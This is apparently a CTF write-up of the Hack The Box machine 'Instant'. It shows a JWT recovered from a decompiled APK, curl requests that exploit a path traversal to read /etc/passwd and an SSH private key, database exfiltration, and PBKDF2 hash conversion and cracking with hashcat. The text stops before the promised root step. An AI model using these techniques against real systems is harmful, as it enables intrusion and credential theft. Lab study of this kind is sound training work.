---
title: "Instant"
date: 2025-04-03T13:48:40-05:00
draft: false
tags: 
- HTB
- Linux
- Path Traversal
- Hashcracking
- Hardcoded Secrets
- Reverse Engineering
- Decompiling
- Hashcracking
- Solar-PuTTY
---

![Instant](/img/instant/instant.png)

## Description
Instant is a medium-difficulty Linux box from Hack The Box. We discover a hardcoded JWT token and a couple of subdomains from a downloadable apk file, from which we exploit a path traversal vulnerability to read a ssh private key and gain a foothold. Credentials from the instant webapp db can then be used to decrypt a Solar-PuTTY session backup file to find the password for root.

## Recon
A TCP reveals SSH open on port 22 and a webapp on port 80.

```
# Nmap 7.94SVN scan initiated Thu Apr  3 10:22:19 2025 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.11.37
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/3%OT=22%CT=1%CU=33135%PV=Y%DS=2%DC=T%G=Y%TM=67EEA
OS:85B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=
OS:A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53
OS:CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W
OS:1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%
OS:O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 18.676 days (since Sat Mar 15 18:12:18 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   39.80 ms 10.10.14.1
2   39.83 ms instant.htb (10.10.11.37)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  3 10:25:15 2025 -- 1 IP address (1 host up) scanned in 176.55 seconds
```

After adding ```instant.htb``` to ```/etc/hosts```, we are brought to a website where we can download a money transfer app.

![Instant webapp](/img/instant/instant_webpage.png)

The download link gives us an apk file. We can decompile it to enumerate for hardcoded secrets, insufficient validation, api calls, and other potential information that could lead us to an exploitable vulnerability. 

```
┌──(kali㉿kali)-[/tmp/instant]
└─$ jadx --output-dir /tmp/instant/decompile /tmp/instant/instant.apk
```

Eventually, some actionable information is returned when searching for ```instant.htb``` in the decompiled apk, including two subdomains ```mywalletv1.instant.htb``` and ```swagger-ui.instant.htb```, a username ```support@instant.htb```, as well as a JWT authorization token in ```AdminActivities.java```.

```
┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ grep -ri "instant.htb" *
grep: resources/classes.dex: binary file matches
resources/res/layout/activity_forgot_password.xml:            android:text="Please contact support@instant.htb to have your account recovered"
resources/res/xml/network_security_config.xml:        <domain includeSubdomains="true">mywalletv1.instant.htb
resources/res/xml/network_security_config.xml:        <domain includeSubdomains="true">swagger-ui.instant.htb
sources/com/instantlabs/instant/LoginActivity.java:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/login").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4
sources/com/instantlabs/instant/AdminActivities.java:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
sources/com/instantlabs/instant/TransactionActivity.java:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/initiate/transaction").addHeader("Authorization", str4).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));
sources/com/instantlabs/instant/TransactionActivity.java:                        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/confirm/pin").header("Authorization", this.val$access_token).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.TransactionActivity.2.2
sources/com/instantlabs/instant/ProfileActivity.java:            new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1
sources/com/instantlabs/instant/RegisterActivity.java:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/register").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3
```

Looking at ```AdminActivities.java```, we can see the JWT token is being used to retrieve user profile information through a call to ```http://mywalletv1.instant.htb/api/v1/view/profile```. 

```java
package com.instantlabs.instant;

import com.google.gson.JsonParser;
import com.google.gson.JsonSyntaxException;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/* loaded from: classes.dex */
public class AdminActivities {
    private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
            static final /* synthetic */ boolean $assertionsDisabled = false;

            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException iOException) {
                System.out.println("Error Here : " + iOException.getMessage());
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());
                    } catch (JsonSyntaxException e) {
                        System.out.println("Error Here : " + e.getMessage());
                    }
                }
            }
        });
        return "Done";
    }
}
```

We can confirm the token is still valid by using it to make a request to the API endpoint.

```
┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl "http://mywalletv1.instant.htb/api/v1/view/profile" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"     
{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}
```


## Foothold
Recall that there is another subdomain that we found, ```swagger-ui.instant.htb```. This subdomain contains documentation for the REST API endpoints on ```mywalletv1.instant.htb```, from which we can get a clearer picture of the app's full range of funcitonality.

![Swagger ui](/img/instant/swagger-ui.png)

There is an API endpoint ```/api/v1/admin/view/logs``` that lets us view available logs. Perhaps one of them has credentials we could use to escalate privileges.

![View logs api endpoint](/img/instant/view_logs.png)

```
┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl "http://mywalletv1.instant.htb/api/v1/admin/view/logs" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
```

The API returns a single log file ```1.log``` in ```shirohige```'s home directory. We can read it by passing in its filename as the argument for ```log_file_name``` to ```/api/v1/admin/read/log```.

![Read log api endpoint](/img/instant/read_log.png)

```
┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl "http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}
```

Unfortunately the log itself reveals nothing of interest. But the fact that the filename is directly appended to the path ```/home/shirohige/logs``` in the response may indicate that the operation for file read also directly passes in user input, casuing a path traversal vulnerability. We can test this by sending a request to read ```/etc/passwd```. 

```
┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl "http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq .  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1673  100  1673    0     0  15447      0 --:--:-- --:--:-- --:--:-- 15490
{
  "/home/shirohige/logs/../../../etc/passwd": [
    "root:x:0:0:root:/root:/bin/bash\n",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
    "sync:x:4:65534:sync:/bin:/bin/sync\n",
    "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
    "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
    "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
    "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n",
    "dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n",
    "messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n",
    "systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n",
    "pollinate:x:102:1::/var/cache/pollinate:/bin/false\n",
    "polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n",
    "usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
    "sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n",
    "shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n",
    "_laurel:x:999:990::/var/log/laurel:/bin/false\n"
  ],
  "Status": 201
}
```

We successfully read the file, now we can enumerate the filesystem.

```
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../proc/self/status" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1912  100  1912    0     0  10027      0 --:--:-- --:--:-- --:--:-- 10063
{
  "/home/shirohige/logs/../../../proc/self/status": [
    "Name:\tpython3\n",
    "Umask:\t0022\n",
    "State:\tS (sleeping)\n",
    "Tgid:\t1334\n",
    "Ngid:\t0\n",
    "Pid:\t1334\n",
    "PPid:\t1\n",
    "TracerPid:\t0\n",
    "Uid:\t1001\t1001\t1001\t1001\n",
    "Gid:\t1002\t1002\t1002\t1002\n",
    "FDSize:\t128\n",
    "Groups:\t1001 1002 \n",
    "NStgid:\t1334\n",
    "NSpid:\t1334\n",
    "NSpgid:\t1334\n",
    "NSsid:\t1334\n",
    "Kthread:\t0\n",
    "VmPeak:\t  201928 kB\n",
    "VmSize:\t  136408 kB\n",
    "VmLck:\t       0 kB\n",
    "VmPin:\t       0 kB\n",
    "VmHWM:\t   54568 kB\n",
    "VmRSS:\t   54568 kB\n",
    "RssAnon:\t   40104 kB\n",
    "RssFile:\t   14464 kB\n",
    "RssShmem:\t       0 kB\n",
    "VmData:\t   58720 kB\n",
    "VmStk:\t     132 kB\n",
    "VmExe:\t    2956 kB\n",
    "VmLib:\t    9756 kB\n",
    "VmPTE:\t     172 kB\n",
    "VmSwap:\t       0 kB\n",
    "HugetlbPages:\t       0 kB\n",
    "CoreDumping:\t0\n",
    "THP_enabled:\t1\n",
    "untag_mask:\t0xffffffffffffffff\n",
    "Threads:\t2\n",
    "SigQ:\t0/7398\n",
    "SigPnd:\t0000000000000000\n",
    "ShdPnd:\t0000000000000000\n",
    "SigBlk:\t0000000000000000\n",
    "SigIgn:\t0000000001001000\n",
    "SigCgt:\t0000000100000002\n",
    "CapInh:\t0000000000000000\n",
    "CapPrm:\t0000000000000000\n",
    "CapEff:\t0000000000000000\n",
    "CapBnd:\t000001ffffffffff\n",
    "CapAmb:\t0000000000000000\n",
    "NoNewPrivs:\t0\n",
    "Seccomp:\t0\n",
    "Seccomp_filters:\t0\n",
    "Speculation_Store_Bypass:\tvulnerable\n",
    "SpeculationIndirectBranch:\tconditional enabled\n",
    "Cpus_allowed:\tffffffff,ffffffff,ffffffff,ffffffff\n",
    "Cpus_allowed_list:\t0-127\n",
    "Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001\n",                                                                                                                                  
    "Mems_allowed_list:\t0\n",
    "voluntary_ctxt_switches:\t53085\n",
    "nonvoluntary_ctxt_switches:\t221\n",
    "x86_Thread_features:\t\n",
    "x86_Thread_features_locked:\t\n"
  ],
  "Status": 201
}
```

Reading ```/proc/self/status```, we can see that our current Uid is 1001, meaning that we can verify that have the permissions of ```shirohige``` (```shirohige```'s Uid is 1001 as seen from ```/etc/passwd```). Further recon shows that ```shirohige``` as a private ssh key that we can read.
```
┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl "http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2809  100  2809    0     0  32082      0 --:--:-- --:--:-- --:--:-- 31920
{
  "/home/shirohige/logs/../.ssh/id_rsa": [
    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
    "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\n",
    "-----END OPENSSH PRIVATE KEY-----\n"
  ],
  "Status": 201
}
```

I saved the key to a file and cleaned it up. Below is the vim macro I used:

```
:%s/    "//g|%s/"//g|%s/,//g|%s/\\n//g
```

Now we can authenticate as ```shirohige```.

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa shirohige@instant.htb   
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Mar 29 20:22:54 2025 from 10.10.14.53
shirohige@instant:~$ 

```


## Privilege Escalation
Instant's database is stored at ```~/projects/mywallet/Instant-Api/mywallet/instance/```. 

```
shirohige@instant:~$ ls -al projects/mywallet/Instant-Api/mywallet/instance/
total 44
drwxr-xr-x 2 shirohige shirohige  4096 Oct  4 15:22 .
drwxr-xr-x 5 shirohige shirohige  4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige 36864 Sep 30 16:34 instant.db
```

Sqlite3 installed though, so I transferred it to my local machine for viewing.

```
shirohige@instant:~$ python3 -m http.server 8000 -d projects/mywallet/Instant-Api/mywallet/instance/
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(kali㉿kali)-[/tmp]
└─$ wget http://instant.htb:8000/instant.db
--2025-03-29 15:30:35--  http://instant.htb:8000/instant.db
Resolving instant.htb (instant.htb)... 10.10.11.37
Connecting to instant.htb (instant.htb)|10.10.11.37|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36864 (36K) [application/octet-stream]
Saving to: ‘instant.db’

instant.db                           100%[======================================================================>]  36.00K  --.-KB/s    in 0.05s   

2025-03-29 15:30:35 (674 KB/s) - ‘instant.db’ saved [36864/36864]
```

There is a ```wallet_users``` table which has, among others, a password column that we can harvest credentials form.


```
sqlite> .schema
CREATE TABLE wallet_users (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        wallet_id VARCHAR, 
        password VARCHAR, 
        create_date VARCHAR, 
        secret_pin INTEGER, 
        role VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email), 
        UNIQUE (wallet_id)
);
CREATE TABLE wallet_wallets (
        id INTEGER NOT NULL, 
        wallet_id VARCHAR, 
        balance INTEGER, 
        invite_token VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (wallet_id), 
        UNIQUE (invite_token)
);
CREATE TABLE wallet_transactions (
        id INTEGER NOT NULL, 
        sender VARCHAR, 
        receiver VARCHAR, 
        amount VARCHAR, 
        txn_fee VARCHAR, 
        note VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id)
);
sqlite> 
```

```
sqlite> select * from wallet_users;
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
```

We get the PBKDF2 hashes for ```admin@instant.htb``` and ```shirohige@instant.htb```. With any luck, these passwords may be reused. However, they are curently not in a hashcat-friendly format. Hashcat expects ```sha256:1000:<base64 encoded salt>:<base64 encoded raw binary value of hash>```. 

```
┌──(kali㉿kali)-[/tmp]
└─$ hashcat -m 10900 --hash-info
hashcat (v6.2.6) starting in hash-info mode

Hash Info:
==========

Hash mode #10900
  Name................: PBKDF2-HMAC-SHA256
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
  Example.Pass........: hashcat
  Benchmark.Mask......: ?b?b?b?b?b?b?b
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX
```

Our current hashes' salts are not base64 encoded, and the hash is in hexadecimal. Luckily, it isn't difficult to convert the hashes we have to a crackable format. I have a script that automates the process:

```shell
#!/bin/bash
# Convert PBKDF2-HMAC-SHA256 into hashcat-crackable format
# Usage: ./pbkdf2-hmac-sha256.sh <hash_file>

OUTFILE='./crackable_hashes.txt'
TEMPFILE='./crackable_hashes.tmp'

while read -r line; do
        IFS='$' read -r head salt hash <<< "$line"
        b64_salt=$(echo -n "$salt" | base64)
        b64_hash=$(echo -n "$hash" | xxd -r -p | base64)
        crackable_hash="$head:$b64_salt:$b64_hash"
        echo "$crackable_hash" >> "$OUTFILE"
done < "$1"

sed 's/\$/\:/g' "$OUTFILE" > "$TEMPFILE"
mv "$TEMPFILE" "$OUTFILE"
```

```shirohige```'s hash eventually cracks.

```
┌──(kali㉿kali)-[/tmp]
└─$ hashcat -a 0 -m 10900 crackable_hashes.txt /usr/share/wordlists/rockyou.txt --show
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
```

The password we get, however, does not work for ```shirohige``` (local user), nor is it the root user's password. We will have too look for other use cases if not another privesc vector entirely.

